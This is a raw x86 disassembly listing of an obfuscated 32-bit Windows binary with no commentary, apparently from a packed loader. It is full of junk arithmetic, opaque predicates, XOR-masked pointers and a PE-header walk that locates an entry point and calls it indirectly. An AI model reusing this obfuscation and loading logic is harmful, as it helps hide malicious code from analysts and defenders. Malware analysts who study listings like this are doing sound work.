  41edb0:	sbb    DWORD PTR ds:0x4228a6,edx
  41edb6:	mov    ecx,DWORD PTR ds:0x4228de
  41edbc:	adc    ecx,DWORD PTR ds:0x4229aa
  41edc2:	mov    DWORD PTR ds:0x4228de,ecx
  41edc8:	inc    DWORD PTR ds:0x4228b2
  41edce:	adc    edx,0x372b
  41edd4:	and    DWORD PTR ds:0x4229be,edx
  41edda:	adc    DWORD PTR ds:0x4229ae,0x769d
  41ede4:	xor    DWORD PTR ds:0x422952,edx
  41edea:	mov    DWORD PTR [esp+0x18],eax
  41edee:	mov    eax,ds:0x422268
  41edf3:	and    DWORD PTR ds:0x422962,ecx
  41edf9:	mov    eax,DWORD PTR [eax+0x1d8]
  41edff:	mov    eax,DWORD PTR [eax]
  41ee01:	sub    DWORD PTR ds:0x42293a,edx
  41ee07:	mov    ecx,eax
  41ee09:	cmp    DWORD PTR ds:0x422932,0x0
  41ee10:	mov    DWORD PTR ds:0x4229c2,0xfd6
  41ee1a:	mov    DWORD PTR ds:0x4229a6,edx
  41ee20:	jmp    0x41ee66
  41ee25:	mov    DWORD PTR ds:0x422992,0x2118
  41ee2f:	jae    0x41ee50
  41ee35:	push   0x4228a6
  41ee3a:	push   0x66c0
  41ee3f:	call   DWORD PTR ds:0x42a084
  41ee45:	inc    edx
  41ee46:	sbb    DWORD PTR ds:0x4228d2,0x6891
  41ee50:	xor    edx,0x2613
  41ee56:	sbb    edx,0x7527
  41ee5c:	mov    DWORD PTR ds:0x4229d2,0x388f
  41ee66:	xor    ecx,0xa3e69a9f
  41ee6c:	xor    eax,0x1
  41ee6f:	shl    eax,0x1e
  41ee72:	mov    DWORD PTR ds:0x4229b6,0x7a6d
  41ee7c:	shr    ecx,0x2
  41ee7f:	xor    edx,edx
  41ee81:	xor    edx,DWORD PTR ds:0x42289a
  41ee87:	or     DWORD PTR ds:0x4229d2,edx
  41ee8d:	or     ecx,eax
  41ee8f:	mov    eax,DWORD PTR [esp+0x18]
  41ee93:	mov    edx,DWORD PTR ds:0x4228ce
  41ee99:	sbb    DWORD PTR ds:0x4228a6,edx
  41ee9f:	mov    DWORD PTR [eax],ecx
  41eea1:	cmp    DWORD PTR ds:0x4229a6,0x0
  41eea8:	mov    DWORD PTR ds:0x4229b6,0x1832
  41eeb2:	mov    DWORD PTR ds:0x42296a,0x16b9
  41eebc:	jmp    0x41ef22
  41eec1:	mov    DWORD PTR ds:0x42290a,0x4517
  41eecb:	mov    eax,ds:0x4229ca
  41eed0:	jbe    0x41eefe
  41eed6:	push   DWORD PTR [ebp-0x10]
  41eed9:	push   DWORD PTR [ebp-0x28]
  41eedc:	push   0x51cb
  41eee1:	push   DWORD PTR [ebp-0x10]
  41eee4:	call   DWORD PTR ds:0x42a2cc
  41eeea:	sbb    ecx,0x7972
  41eef0:	mov    edx,DWORD PTR ds:0x422952
  41eef6:	xor    DWORD PTR ds:0x4229a2,edx
  41eefc:	add    edx,edx
  41eefe:	mov    edx,DWORD PTR ds:0x4229e2
  41ef04:	mov    edx,DWORD PTR [edx]
  41ef06:	adc    DWORD PTR ds:0x42296e,edx
  41ef0c:	sub    DWORD PTR ds:0x422992,0x5992
  41ef16:	sbb    DWORD PTR ds:0x42294e,edi
  41ef1c:	neg    DWORD PTR ds:0x4228c2
  41ef22:	lea    edi,[ebx-0x10]
  41ef25:	add    DWORD PTR ds:0x4229a6,0x146e
  41ef2f:	mov    DWORD PTR [esp+0x80],edi
  41ef36:	or     DWORD PTR ds:0x42297e,ecx
  41ef3c:	mov    DWORD PTR [esp+0x84],esi
  41ef43:	mov    eax,DWORD PTR [esp+0x80]
  41ef4a:	mov    ecx,DWORD PTR [esp+0x84]
  41ef51:	sub    edx,DWORD PTR ds:0x42289a
  41ef57:	shrd   eax,ecx,0x2
  41ef5b:	shr    ecx,0x2
  41ef5e:	mov    ecx,DWORD PTR [esp+0x80]
  41ef65:	adc    edx,DWORD PTR ds:0x4228d2
  41ef6b:	mov    edx,DWORD PTR [esp+0x84]
  41ef72:	adc    DWORD PTR ds:0x4228ea,0x422972
  41ef7c:	xor    eax,0x2e9a655c
  41ef81:	xor    edx,edx
  41ef83:	or     DWORD PTR ds:0x42297e,0x4228ea
  41ef8d:	or     edx,eax
  41ef8f:	mov    eax,ds:0x422268
  41ef94:	or     DWORD PTR ds:0x4229b2,0x2c69
  41ef9e:	push   edx
  41ef9f:	push   DWORD PTR [eax+0x19c]
  41efa5:	or     DWORD PTR ds:0x422922,0x4228d6
  41efaf:	lea    eax,[esp+0x84]
  41efb6:	add    DWORD PTR ds:0x4228ca,0x6620
  41efc0:	push   eax
  41efc1:	shl    ecx,0x1e
  41efc4:	call   0x41d30a
  41efc9:	lea    eax,[ebp+0x10]
  41efcc:	xor    DWORD PTR ds:0x422946,0x45ca
  41efd6:	push   eax
  41efd7:	and    DWORD PTR ds:0x42292a,0x42289a
  41efe1:	mov    DWORD PTR [esp+0x4c],edi
  41efe5:	sbb    DWORD PTR ds:0x4228ea,0x4647
  41efef:	mov    DWORD PTR [esp+0x50],esi
  41eff3:	lea    eax,[ebp+0xc]
  41eff6:	push   eax
  41eff7:	mov    DWORD PTR ds:0x4229a2,0x343e
  41f001:	mov    DWORD PTR [esp+0x50],edi
  41f005:	lea    eax,[ebp+0x8]
  41f008:	sbb    DWORD PTR ds:0x4229a6,0x424a
  41f012:	mov    DWORD PTR [esp+0x54],esi
  41f016:	sub    DWORD PTR ds:0x4228de,0x42288e
  41f020:	mov    DWORD PTR [esp+0x50],edi
  41f024:	add    DWORD PTR ds:0x42298a,0x42297a
  41f02e:	mov    DWORD PTR [esp+0x54],esi
  41f032:	push   eax
  41f033:	not    DWORD PTR ds:0x422996
  41f039:	call   0x41c16b
  41f03e:	or     DWORD PTR ds:0x42299a,0x467c
  41f048:	push   0x4
  41f04a:	adc    DWORD PTR ds:0x422896,0x42298a
  41f054:	push   0x4220ec
  41f059:	or     DWORD PTR ds:0x4229a2,0x42297a
  41f063:	push   DWORD PTR [esp+0x18]
  41f067:	adc    DWORD PTR ds:0x422902,0x4228b2
  41f071:	call   0x41d30a
  41f076:	mov    eax,DWORD PTR [esp+0x10]
  41f07a:	adc    DWORD PTR ds:0x42293e,edi
  41f080:	mov    ecx,DWORD PTR [esp+0x10]
  41f084:	add    edx,DWORD PTR ds:0x422962
  41f08a:	mov    eax,DWORD PTR [eax]
  41f08c:	cmp    DWORD PTR ds:0x422996,0x0
  41f093:	mov    DWORD PTR ds:0x422976,0x7903
  41f09d:	not    DWORD PTR ds:0x4228e2
  41f0a3:	jmp    0x41f0d7
  41f0a8:	mov    DWORD PTR ds:0x422942,edi
  41f0ae:	jle    0x41f0cb
  41f0b4:	push   DWORD PTR [ebp-0x10]
  41f0b7:	call   DWORD PTR ds:0x42a088
  41f0bd:	neg    edi
  41f0bf:	sbb    edx,DWORD PTR ds:0x422936
  41f0c5:	not    DWORD PTR ds:0x42299a
  41f0cb:	not    edi
  41f0cd:	adc    DWORD PTR ds:0x42290e,0x107e
  41f0d7:	mov    ecx,DWORD PTR [ecx]
  41f0d9:	shr    eax,0x1e
  41f0dc:	shl    ecx,0x2
  41f0df:	or     eax,ecx
  41f0e1:	mov    ecx,DWORD PTR [esp+0x10]
  41f0e5:	xor    eax,0xa3e69a9d
  41f0ea:	mov    DWORD PTR [ecx],eax
  41f0ec:	lea    eax,[esp+0x54]
  41f0f0:	mov    DWORD PTR [esp+0x94],eax
  41f0f7:	lea    eax,[esp+0x94]
  41f0fe:	mov    DWORD PTR [esp+0x90],eax
  41f105:	mov    eax,DWORD PTR [esp+0x54]
  41f109:	sub    DWORD PTR [esp+0x54],eax
  41f10d:	lea    eax,[ebp+0x4]
  41f110:	xor    DWORD PTR [esp+0x54],eax
  41f114:	mov    DWORD PTR [esp+0x10],0x5b3d
  41f11c:	mov    DWORD PTR [esp+0x14],0x4445
  41f124:	mov    DWORD PTR [esp+0x38],0xa52
  41f12c:	mov    DWORD PTR [esp+0x3c],0x1c69
  41f134:	mov    eax,DWORD PTR [esp+0x38]
  41f138:	mov    ecx,DWORD PTR [esp+0x3c]
  41f13c:	mov    edx,DWORD PTR [esp+0x10]
  41f140:	mov    edi,DWORD PTR [esp+0x14]
  41f144:	add    eax,0xffffd1a5
  41f149:	adc    ecx,0xffffedf0
  41f14f:	xor    eax,edx
  41f151:	xor    ecx,edi
  41f153:	and    eax,0x325d
  41f158:	mov    DWORD PTR [esp+0x40],eax
  41f15c:	and    ecx,0x3544
  41f162:	mov    DWORD PTR [esp+0x44],ecx
  41f166:	mov    DWORD PTR [esp+0x18],0x1704
  41f16e:	mov    DWORD PTR [esp+0x1c],0x4a75
  41f176:	mov    DWORD PTR [esp+0x10],0x985
  41f17e:	mov    DWORD PTR [esp+0x14],0x341
  41f186:	mov    DWORD PTR [esp+0x38],0x5aa9
  41f18e:	mov    DWORD PTR [esp+0x3c],0x221a
  41f196:	mov    eax,DWORD PTR [esp+0x38]
  41f19a:	mov    ecx,DWORD PTR [esp+0x3c]
  41f19e:	mov    edx,DWORD PTR [esp+0x10]
  41f1a2:	mov    edi,DWORD PTR [esp+0x14]
  41f1a6:	push   edi
  41f1a7:	push   edx
  41f1a8:	or     ecx,0xc32
  41f1ae:	or     eax,0x502a
  41f1b3:	push   ecx
  41f1b4:	push   eax
  41f1b5:	call   0x41dfb1
  41f1ba:	mov    ecx,DWORD PTR [esp+0x18]
  41f1be:	mov    edi,DWORD PTR [esp+0x1c]
  41f1c2:	sub    eax,ecx
  41f1c4:	mov    ecx,DWORD PTR [esp+0x40]
  41f1c8:	sbb    edx,edi
  41f1ca:	mov    edi,DWORD PTR [esp+0x44]
  41f1ce:	cmp    ecx,eax
  41f1d0:	jne    0x41f1de
  41f1d6:	cmp    edi,edx
  41f1d8:	je     0x41f69d
  41f1de:	mov    DWORD PTR [esp+0x10],0x71ba
  41f1e6:	mov    DWORD PTR [esp+0x14],0x5f78
  41f1ee:	mov    DWORD PTR [esp+0x38],0x7b9c
  41f1f6:	mov    DWORD PTR [esp+0x3c],0x5622
  41f1fe:	mov    eax,DWORD PTR [esp+0x38]
  41f202:	mov    ecx,DWORD PTR [esp+0x3c]
  41f206:	mov    edx,DWORD PTR [esp+0x10]
  41f20a:	mov    edi,DWORD PTR [esp+0x14]
  41f20e:	add    eax,0x3646
  41f213:	adc    ecx,0x7ace
  41f219:	xor    eax,0x3e2e
  41f21e:	xor    ecx,0x4b71
  41f224:	and    eax,edx
  41f226:	mov    DWORD PTR [esp+0x48],eax
  41f22a:	and    ecx,edi
  41f22c:	mov    DWORD PTR [esp+0x4c],ecx
  41f230:	mov    DWORD PTR [esp+0x40],0x18d6
  41f238:	mov    DWORD PTR [esp+0x44],0x2bb4
  41f240:	mov    DWORD PTR [esp+0x18],0x14
  41f248:	mov    DWORD PTR [esp+0x1c],0x0
  41f250:	mov    DWORD PTR [esp+0x10],0x1
  41f258:	mov    DWORD PTR [esp+0x14],0x0
  41f260:	mov    DWORD PTR [esp+0x38],0xa87
  41f268:	mov    DWORD PTR [esp+0x3c],0x7fd9
  41f270:	mov    eax,DWORD PTR [esp+0x38]
  41f274:	mov    ecx,DWORD PTR [esp+0x3c]
  41f278:	push   0x2
  41f27a:	push   0x7f349462
  41f27f:	xor    ecx,0x3601
  41f285:	xor    eax,0x5491
  41f28a:	push   ecx
  41f28b:	push   eax
  41f28c:	call   0x421af6
  41f291:	mov    ecx,DWORD PTR [esp+0x10]
  41f295:	mov    edi,DWORD PTR [esp+0x14]
  41f299:	push   edi
  41f29a:	push   ecx
  41f29b:	push   edx
  41f29c:	push   eax
  41f29d:	call   0x421af6
  41f2a2:	mov    ecx,DWORD PTR [esp+0x18]
  41f2a6:	mov    edi,DWORD PTR [esp+0x1c]
  41f2aa:	push   edi
  41f2ab:	push   ecx
  41f2ac:	push   edx
  41f2ad:	push   eax
  41f2ae:	call   0x421af6
  41f2b3:	mov    ecx,DWORD PTR [esp+0x40]
  41f2b7:	mov    edi,DWORD PTR [esp+0x44]
  41f2bb:	add    eax,ecx
  41f2bd:	mov    ecx,DWORD PTR [esp+0x48]
  41f2c1:	adc    edx,edi
  41f2c3:	mov    edi,DWORD PTR [esp+0x4c]
  41f2c7:	cmp    ecx,eax
  41f2c9:	jne    0x41f2d7
  41f2cf:	cmp    edi,edx
  41f2d1:	je     0x41f69d
  41f2d7:	mov    eax,DWORD PTR [esp+0x54]
  41f2db:	mov    edx,DWORD PTR [esp+0x20]
  41f2df:	mov    edi,DWORD PTR [esp+0x24]
  41f2e3:	xor    ecx,ecx
  41f2e5:	shld   ecx,eax,0x2
  41f2e9:	shl    eax,0x2
  41f2ec:	xor    eax,ebx
  41f2ee:	xor    ecx,esi
  41f2f0:	cmp    eax,edx
  41f2f2:	jne    0x41f300
  41f2f8:	cmp    ecx,edi
  41f2fa:	je     0x41f69d
  41f300:	mov    eax,DWORD PTR [esp+0x58]
  41f304:	cmp    eax,0xa3e69a99
  41f309:	je     0x41f360
  41f30f:	mov    eax,DWORD PTR [esp+0x20]
  41f313:	mov    ecx,DWORD PTR [esp+0x24]
  41f317:	mov    edx,DWORD PTR [esp+0x20]
  41f31b:	mov    edi,DWORD PTR [esp+0x24]
  41f31f:	xor    edi,esi
  41f321:	xor    edx,ebx
  41f323:	shrd   edx,edi,0x2
  41f327:	mov    ecx,eax
  41f329:	shr    edi,0x2
  41f32c:	xor    eax,eax
  41f32e:	mov    DWORD PTR [esp+0x10],edi
  41f332:	mov    edi,edx
  41f334:	or     edi,eax
  41f336:	mov    eax,DWORD PTR [esp+0x10]
  41f33a:	shl    ecx,0x1e
  41f33d:	xor    ecx,0xc0000000
  41f343:	or     eax,ecx
  41f345:	mov    DWORD PTR [esp+0x4c],eax
  41f349:	mov    eax,DWORD PTR [esp+0x68]
  41f34d:	cdq    
  41f34e:	cmp    edi,eax
  41f350:	jne    0x41f69d
  41f356:	cmp    DWORD PTR [esp+0x4c],edx
  41f35a:	jne    0x41f69d
  41f360:	mov    DWORD PTR [esp+0x64],0x422304
  41f368:	mov    DWORD PTR [esp+0x6c],0x4222fc
  41f370:	mov    eax,DWORD PTR [esp+0x7c]
  41f374:	mov    eax,DWORD PTR [esp+0x7c]
  41f378:	mov    edx,DWORD PTR [esp+0x20]
  41f37c:	mov    edi,DWORD PTR [esp+0x24]
  41f380:	xor    ecx,ecx
  41f382:	shld   ecx,eax,0x2
  41f386:	shl    eax,0x2
  41f389:	xor    eax,ebx
  41f38b:	xor    ecx,esi
  41f38d:	cmp    edx,eax
  41f38f:	jne    0x41f5ad
  41f395:	cmp    edi,ecx
  41f397:	jne    0x41f5ad
  41f39d:	mov    DWORD PTR [esp+0x10],0x42228c
  41f3a5:	mov    ecx,DWORD PTR [esp+0x20]
  41f3a9:	mov    eax,DWORD PTR [esp+0x24]
  41f3ad:	shrd   ecx,eax,0x2
  41f3b1:	shr    eax,0x2
  41f3b4:	mov    eax,DWORD PTR [esp+0x20]
  41f3b8:	mov    edx,DWORD PTR [esp+0x24]
  41f3bc:	shl    eax,0x1e
  41f3bf:	mov    edi,0x2e9a655c
  41f3c4:	xor    ecx,edi
  41f3c6:	xor    eax,eax
  41f3c8:	or     eax,ecx
  41f3ca:	mov    ecx,DWORD PTR [esp+0x10]
  41f3ce:	mov    ecx,DWORD PTR [ecx+0xc]
  41f3d1:	cmp    eax,DWORD PTR [ecx]
  41f3d3:	jne    0x41f54c
  41f3d9:	mov    eax,0x65c7
  41f3de:	mov    WORD PTR [esp+0x40],ax
  41f3e3:	mov    eax,0x6062
  41f3e8:	mov    WORD PTR [esp+0x18],ax
  41f3ed:	mov    eax,0x125d
  41f3f2:	mov    WORD PTR [esp+0x10],ax
  41f3f7:	movzx  eax,WORD PTR [esp+0x10]
  41f3fc:	mov    ecx,0x2d0f
  41f401:	and    ax,cx
  41f404:	mov    cx,WORD PTR [esp+0x18]
  41f409:	or     ax,cx
  41f40c:	mov    cx,WORD PTR [esp+0x40]
  41f411:	add    ax,cx
  41f414:	or     eax,0x3b22
  41f419:	mov    WORD PTR [esp+0x30],ax
  41f41e:	mov    eax,0x57d4
  41f423:	mov    WORD PTR [esp+0x40],ax
  41f428:	mov    eax,0x3b21
  41f42d:	mov    WORD PTR [esp+0x2c],ax
  41f432:	mov    eax,0x52fd
  41f437:	mov    WORD PTR [esp+0x18],ax
  41f43c:	mov    eax,0x2ce0
  41f441:	mov    WORD PTR [esp+0x10],ax
  41f446:	mov    ax,WORD PTR [esp+0x10]
  41f44b:	mov    cx,WORD PTR [esp+0x18]
  41f450:	or     ax,cx
  41f453:	mov    ecx,0x21a4
  41f458:	or     ax,cx
  41f45b:	mov    cx,WORD PTR [esp+0x40]
  41f460:	sub    ax,cx
  41f463:	mov    cx,WORD PTR [esp+0x2c]
  41f468:	sub    ax,cx
  41f46b:	mov    cx,WORD PTR [esp+0x30]
  41f470:	cmp    cx,ax
  41f473:	jbe    0x41f54c
  41f479:	mov    eax,0x5008
  41f47e:	mov    WORD PTR [esp+0x18],ax
  41f483:	mov    eax,0x60ce
  41f488:	mov    WORD PTR [esp+0x10],ax
  41f48d:	movzx  eax,WORD PTR [esp+0x10]
  41f492:	mov    ecx,0x2095
  41f497:	or     ax,cx
  41f49a:	mov    cx,WORD PTR [esp+0x18]
  41f49f:	sub    ax,cx
  41f4a2:	mov    ecx,0x10de
  41f4a7:	or     eax,0x742f
  41f4ac:	imul   eax,eax,0x30b2
  41f4b2:	mov    WORD PTR [esp+0x30],ax
  41f4b7:	mov    eax,0x6143
  41f4bc:	mov    WORD PTR [esp+0x2c],ax
  41f4c1:	mov    eax,0x679f
  41f4c6:	mov    WORD PTR [esp+0x40],ax
  41f4cb:	mov    eax,0x1210
  41f4d0:	mov    WORD PTR [esp+0x18],ax
  41f4d5:	mov    eax,0x3308
  41f4da:	mov    WORD PTR [esp+0x10],ax
  41f4df:	mov    ax,WORD PTR [esp+0x10]
  41f4e4:	sub    ax,cx
  41f4e7:	mov    cx,WORD PTR [esp+0x18]
  41f4ec:	xor    ax,cx
  41f4ef:	mov    cx,WORD PTR [esp+0x40]
  41f4f4:	imul   ax,cx
  41f4f8:	mov    cx,WORD PTR [esp+0x2c]
  41f4fd:	and    ax,cx
  41f500:	mov    ecx,0x694c
  41f505:	and    ax,cx
  41f508:	mov    cx,WORD PTR [esp+0x30]
  41f50d:	cmp    cx,ax
  41f510:	ja     0x41f54c
  41f516:	mov    eax,DWORD PTR [esp+0x20]
  41f51a:	mov    ecx,DWORD PTR [esp+0x24]
  41f51e:	shrd   eax,ecx,0x2
  41f522:	shr    ecx,0x2
  41f525:	mov    ecx,DWORD PTR [esp+0x20]
  41f529:	mov    edx,DWORD PTR [esp+0x24]
  41f52d:	xor    eax,edi
  41f52f:	xor    edx,edx
  41f531:	or     edx,eax
  41f533:	push   edx
  41f534:	push   esi
  41f535:	push   0xba699563
  41f53a:	lea    eax,[esp+0x7c]
  41f53e:	push   eax
  41f53f:	lea    eax,[esp+0x30]
  41f543:	push   eax
  41f544:	shl    ecx,0x1e
  41f547:	call   0x41d292
  41f54c:	push   DWORD PTR [esp+0x74]
  41f550:	push   DWORD PTR [esp+0x74]
  41f554:	push   DWORD PTR [esp+0x2c]
  41f558:	push   DWORD PTR [esp+0x2c]
  41f55c:	call   0x41d466
  41f561:	mov    ecx,DWORD PTR [esp+0x20]
  41f565:	mov    eax,DWORD PTR [esp+0x24]
  41f569:	shrd   ecx,eax,0x2
  41f56d:	shr    eax,0x2
  41f570:	mov    eax,DWORD PTR [esp+0x20]
  41f574:	mov    edx,DWORD PTR [esp+0x24]
  41f578:	shl    eax,0x1e
  41f57b:	xor    eax,eax
  41f57d:	xor    ecx,edi
  41f57f:	or     eax,ecx
  41f581:	mov    ecx,DWORD PTR [esp+0x64]
  41f585:	mov    DWORD PTR [ecx],eax
  41f587:	mov    ecx,DWORD PTR [esp+0x20]
  41f58b:	mov    eax,DWORD PTR [esp+0x24]
  41f58f:	shrd   ecx,eax,0x2
  41f593:	shr    eax,0x2
  41f596:	mov    eax,DWORD PTR [esp+0x20]
  41f59a:	mov    edx,DWORD PTR [esp+0x24]
  41f59e:	shl    eax,0x1e
  41f5a1:	xor    ecx,edi
  41f5a3:	xor    eax,eax
  41f5a5:	or     eax,ecx
  41f5a7:	mov    ecx,DWORD PTR [esp+0x6c]
  41f5ab:	mov    DWORD PTR [ecx],eax
  41f5ad:	mov    eax,DWORD PTR [esp+0x6c]
  41f5b1:	mov    ecx,DWORD PTR [esp+0x6c]
  41f5b5:	mov    eax,DWORD PTR [eax]
  41f5b7:	cmp    eax,DWORD PTR [ecx]
  41f5b9:	jne    0x41f681
  41f5bf:	mov    eax,DWORD PTR [esp+0x64]
  41f5c3:	mov    ecx,DWORD PTR [esp+0x64]
  41f5c7:	mov    eax,DWORD PTR [eax]
  41f5c9:	cmp    eax,DWORD PTR [ecx]
  41f5cb:	jne    0x41f681
  41f5d1:	mov    BYTE PTR [esp+0x40],0x20
  41f5d6:	mov    BYTE PTR [esp+0x2c],0x3
  41f5db:	mov    BYTE PTR [esp+0x30],0x6d
  41f5e0:	mov    BYTE PTR [esp+0x37],0x90
  41f5e5:	mov    al,BYTE PTR [esp+0x37]
  41f5e9:	mov    cl,BYTE PTR [esp+0x30]
  41f5ed:	or     al,0xdc
  41f5ef:	sub    al,cl
  41f5f1:	mov    cl,BYTE PTR [esp+0x2c]
  41f5f5:	sub    al,0x56
  41f5f7:	movzx  eax,al
  41f5fa:	movzx  ecx,cl
  41f5fd:	cdq    
  41f5fe:	idiv   ecx
  41f600:	movzx  ecx,BYTE PTR [esp+0x40]
  41f605:	or     eax,ecx
  41f607:	mov    BYTE PTR [esp+0x10],al
  41f60b:	mov    BYTE PTR [esp+0x18],0x1
  41f610:	mov    BYTE PTR [esp+0x37],0xcf
  41f615:	mov    BYTE PTR [esp+0x30],0x6
  41f61a:	mov    BYTE PTR [esp+0x2c],0x25
  41f61f:	mov    BYTE PTR [esp+0x40],0xf8
  41f624:	mov    al,BYTE PTR [esp+0x40]
  41f628:	mov    cl,BYTE PTR [esp+0x2c]
  41f62c:	or     al,0xc4
  41f62e:	and    al,cl
  41f630:	mov    cl,BYTE PTR [esp+0x30]
  41f634:	imul   cl
  41f636:	mov    cl,BYTE PTR [esp+0x37]
  41f63a:	movzx  ecx,cl
  41f63d:	movzx  eax,al
  41f640:	and    eax,ecx
  41f642:	mov    cl,BYTE PTR [esp+0x18]
  41f646:	movzx  ecx,cl
  41f649:	cdq    
  41f64a:	idiv   ecx
  41f64c:	mov    cl,BYTE PTR [esp+0x10]
  41f650:	cmp    cl,al
  41f652:	je     0x41f69d
  41f658:	lea    eax,[esp+0x90]
  41f65f:	push   eax
  41f660:	lea    edi,[esp+0x90]
  41f667:	call   0x41c4c4
  41f66c:	cmp    eax,ebx
  41f66e:	jne    0x41f69d
  41f674:	cmp    edx,esi
  41f676:	jne    0x41f69d
  41f67c:	jmp    0x41e203
  41f681:	mov    eax,DWORD PTR [esp+0x70]
  41f685:	mov    ecx,DWORD PTR [esp+0x74]
  41f689:	mov    edx,DWORD PTR [esp+0x20]
  41f68d:	mov    edi,DWORD PTR [esp+0x24]
  41f691:	add    eax,edx
  41f693:	adc    ecx,edi
  41f695:	mov    DWORD PTR [esp+0x20],eax
  41f699:	mov    DWORD PTR [esp+0x24],ecx
  41f69d:	push   0x4
  41f69f:	push   0x422268
  41f6a4:	lea    eax,[esp+0x64]
  41f6a8:	push   eax
  41f6a9:	call   0x41d30a
  41f6ae:	mov    eax,DWORD PTR [esp+0x5c]
  41f6b2:	push   0x4
  41f6b4:	push   DWORD PTR [eax+0x1a4]
  41f6ba:	lea    eax,[esp+0x68]
  41f6be:	push   eax
  41f6bf:	call   0x41d30a
  41f6c4:	mov    eax,DWORD PTR [esp+0x5c]
  41f6c8:	mov    eax,DWORD PTR [eax+0x1a4]
  41f6ce:	mov    eax,DWORD PTR [eax]
  41f6d0:	mov    ecx,DWORD PTR [esp+0x5c]
  41f6d4:	mov    eax,DWORD PTR [eax+0x3c]
  41f6d7:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41f6dd:	mov    ecx,DWORD PTR [ecx]
  41f6df:	lea    eax,[ecx+eax*1+0x28]
  41f6e3:	mov    eax,DWORD PTR [eax]
  41f6e5:	add    DWORD PTR [esp+0x60],eax
  41f6e9:	mov    DWORD PTR [esp+0x18],0x127
  41f6f1:	mov    DWORD PTR [esp+0x10],0x421a
  41f6f9:	mov    eax,DWORD PTR [esp+0x10]
  41f6fd:	and    eax,0xffffc244
  41f702:	add    eax,DWORD PTR [esp+0x18]
  41f706:	and    eax,0xfffffe5a
  41f70b:	sub    eax,0x2ae1
  41f710:	and    eax,0x6f90
  41f715:	mov    DWORD PTR [esp+0x18],eax
  41f719:	mov    DWORD PTR [esp+0x10],0x1515
  41f721:	mov    eax,DWORD PTR [esp+0x10]
  41f725:	mov    ecx,DWORD PTR [esp+0x18]
  41f729:	or     eax,0x7113
  41f72e:	add    eax,0x3d6a
  41f733:	cmp    ecx,eax
  41f735:	je     0x41f825
  41f73b:	mov    eax,DWORD PTR [esp+0x54]
  41f73f:	mov    edx,DWORD PTR [esp+0x20]
  41f743:	mov    edi,DWORD PTR [esp+0x24]
  41f747:	xor    ecx,ecx
  41f749:	shld   ecx,eax,0x2
  41f74d:	shl    eax,0x2
  41f750:	xor    eax,ebx
  41f752:	xor    ecx,esi
  41f754:	cmp    eax,edx
  41f756:	jne    0x41f764
  41f75c:	cmp    ecx,edi
  41f75e:	je     0x41f7de
  41f764:	mov    eax,DWORD PTR [esp+0x58]
  41f768:	mov    eax,DWORD PTR [esp+0x58]
  41f76c:	mov    eax,DWORD PTR [esp+0x58]
  41f770:	mov    ecx,DWORD PTR [esp+0x58]
  41f774:	xor    eax,0xa3e69a9f
  41f779:	xor    ecx,0x1
  41f77c:	shr    eax,0x2
  41f77f:	shl    ecx,0x1e
  41f782:	or     eax,ecx
  41f784:	xor    ecx,ecx
  41f786:	shld   ecx,eax,0x2
  41f78a:	shl    eax,0x2
  41f78d:	xor    eax,ebx
  41f78f:	xor    ecx,esi
  41f791:	cmp    eax,0xba699577
  41f796:	jne    0x41f7a4
  41f79c:	cmp    ecx,esi
  41f79e:	je     0x41f825
  41f7a4:	mov    eax,DWORD PTR [esp+0x68]
  41f7a8:	cdq    
  41f7a9:	mov    eax,DWORD PTR [esp+0x68]
  41f7ad:	mov    ecx,edx
  41f7af:	cdq    
  41f7b0:	shld   edx,eax,0x2
  41f7b4:	shr    ecx,0x1e
  41f7b7:	xor    edi,edi
  41f7b9:	shl    eax,0x2
  41f7bc:	or     eax,ecx
  41f7be:	or     edx,edi
  41f7c0:	mov    ecx,edx
  41f7c2:	mov    edx,DWORD PTR [esp+0x20]
  41f7c6:	xor    eax,ebx
  41f7c8:	xor    ecx,esi
  41f7ca:	mov    esi,DWORD PTR [esp+0x24]
  41f7ce:	cmp    edx,eax
  41f7d0:	jne    0x41f7de
  41f7d6:	cmp    esi,ecx
  41f7d8:	je     0x41f825
  41f7de:	push   DWORD PTR ds:0x422358
  41f7e4:	push   DWORD PTR ds:0x4220ec
  41f7ea:	mov    eax,ds:0x422268
  41f7ef:	mov    eax,DWORD PTR [eax+0x1a4]
  41f7f5:	push   DWORD PTR [eax]
  41f7f7:	mov    eax,DWORD PTR [esp+0x6c]
  41f7fb:	call   eax
  41f7fd:	mov    ecx,DWORD PTR ds:0x422268
  41f803:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41f809:	mov    DWORD PTR [ecx],eax
  41f80b:	mov    eax,ds:0x422268
  41f810:	push   0x4
  41f812:	add    eax,0x1dc
  41f817:	push   eax
  41f818:	lea    eax,[esp+0x94]
  41f81f:	push   eax
  41f820:	call   0x41d30a
  41f825:	mov    eax,DWORD PTR [esp+0x8c]
  41f82c:	mov    eax,DWORD PTR [eax]
  41f82e:	pop    edi
  41f82f:	pop    esi
  41f830:	pop    ebx
  41f831:	mov    esp,ebp
  41f833:	pop    ebp
  41f834:	ret    0xc
  41f837:	push   ebp
  41f838:	mov    ebp,esp
  41f83a:	sub    esp,0x23c
  41f840:	cmp    DWORD PTR ds:0x4228c2,0x0
  41f847:	mov    DWORD PTR ds:0x42297a,0x7f83
  41f851:	mov    DWORD PTR ds:0x4228d6,0x6307
  41f85b:	movzx  ecx,BYTE PTR ds:0x4228ba
  41f862:	jmp    0x41f8d8
  41f867:	mov    eax,0x73d2
  41f86c:	ja     0x41f8b8
  41f872:	push   0x7572
  41f877:	push   0x3356
  41f87c:	push   DWORD PTR [ebp-0x18]
  41f87f:	call   DWORD PTR ds:0x42a08c
  41f885:	movzx  ecx,WORD PTR ds:0x4228c6
  41f88c:	sub    DWORD PTR ds:0x42289e,ecx
  41f892:	add    DWORD PTR ds:0x42298a,0x51b4
  41f89c:	xor    DWORD PTR ds:0x4228ae,0x409b
  41f8a6:	mov    ecx,DWORD PTR ds:0x4229a2
  41f8ac:	or     ecx,DWORD PTR ds:0x42293e
  41f8b2:	mov    DWORD PTR ds:0x4229a2,ecx
  41f8b8:	sbb    ecx,DWORD PTR ds:0x4229d2
  41f8be:	sbb    DWORD PTR ds:0x422926,0x11d6
  41f8c8:	mov    DWORD PTR ds:0x4228ca,0x27b8
  41f8d2:	sbb    DWORD PTR ds:0x422976,edi
  41f8d8:	push   ebx
  41f8d9:	and    eax,ecx
  41f8db:	push   esi
  41f8dc:	movzx  ecx,WORD PTR ds:0x42293a
  41f8e3:	and    DWORD PTR ds:0x42292e,ecx
  41f8e9:	push   edi
  41f8ea:	xor    eax,eax
  41f8ec:	mov    DWORD PTR [ebp-0x50],0x1
  41f8f3:	mov    DWORD PTR [ebp-0xbc],0x61a1
